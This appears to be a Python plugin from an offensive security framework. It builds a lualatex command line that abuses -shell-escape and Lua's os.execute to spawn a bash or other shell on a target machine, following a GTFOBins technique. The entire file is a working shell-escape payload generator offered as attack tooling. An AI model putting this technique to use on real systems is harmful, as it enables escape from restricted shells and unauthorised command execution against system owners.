from ogabog.cores import plugin, const


class PTY(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[PTYShell] LuaLatext PTY shell escape. https://gtfobins.github.io/gtfobins/lualatex/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
        self.shell_type = "pty"

    def make_shell(self):
        self.shell = "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{"
        self.shell += f"os.execute(\"{self.args.shell}\")"
        self.shell += "}\\end{document}'"
